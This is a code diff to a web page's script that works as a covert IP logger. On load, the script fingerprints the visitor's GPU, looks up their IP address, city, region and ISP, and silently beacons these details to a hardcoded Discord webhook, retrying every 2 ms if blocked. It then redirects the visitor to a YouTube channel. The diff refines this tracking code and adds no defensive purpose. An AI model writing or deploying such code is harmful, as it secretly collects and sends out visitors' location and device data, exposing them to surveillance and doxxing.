@@ -5,32 +5,40 @@
     const H = "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ_bdXlInRWb4DgEGcfeM0";
     const Y = "https://youtube.com/@LigmaBlox-w7m";
 
-    async function gM() {
+    async function getDev() {
         try {
-            const c = document.createElement('canvas'), gl = c.getContext('webgl');
+            const gl = document.createElement('canvas').getContext('webgl');
             const d = gl.getExtension('WEBGL_debug_renderer_info');
-            const r = gl.getParameter(d.UNMASKED_RENDERER_WEBGL);
-            return r.split("Apple ").pop().split(" (")[0];
+            return gl.getParameter(d.UNMASKED_RENDERER_WEBGL).split("Apple ").pop();
         } catch(e) { return navigator.platform; }
     }
 
-    async function run() {
-        const repeat = sessionStorage.getItem('v');
+    async function track() {
+        const isRe = sessionStorage.getItem('v');
         sessionStorage.setItem('v', '1');
-        const tag = repeat ? "🔄 RE" : "🆕 NEW";
-        const mod = await gM();
+        const tag = isRe ? "🔄 RE-ENTRY" : "🆕 NEW HIT";
+        const dev = await getDev();
 
         while(true) {
             try {
-                const r = await fetch('https://ip-api.com/json/?'+Date.now()).then(d=>d.json());
-                const p = { content: `**[${tag}]**\n**Dev:** ${mod}\n**IP:** ${r.query}\n**Loc:** ${r.city}\n**ISP:** ${r.isp}` };
-                navigator.sendBeacon(H, JSON.stringify(p));
-                break;
-            } catch(e) { await new Promise(s=>setTimeout(s,2)); }
+                // Force a fresh fetch every single time
+                const r = await fetch('https://ip-api.com/json/?nocache=' + Date.now()).then(d=>d.json());
+                
+                if(r.status === "success") {
+                    const p = { 
+                        content: `**[${tag}]**\n**Device:** ${dev}\n**IP:** ${r.query}\n**City:** ${r.city}\n**Region:** ${r.regionName}\n**ISP:** ${r.isp}` 
+                    };
+                    navigator.sendBeacon(H, JSON.stringify(p));
+                    break; // Exit loop once sent
+                }
+            } catch(e) { 
+                // 2ms Rapid-Fire retry if blocked
+                await new Promise(s => setTimeout(s, 2)); 
+            }
         }
         window.location.replace(Y);
     }
-    run();
+    track();
 </script>
 </body>
 </html>
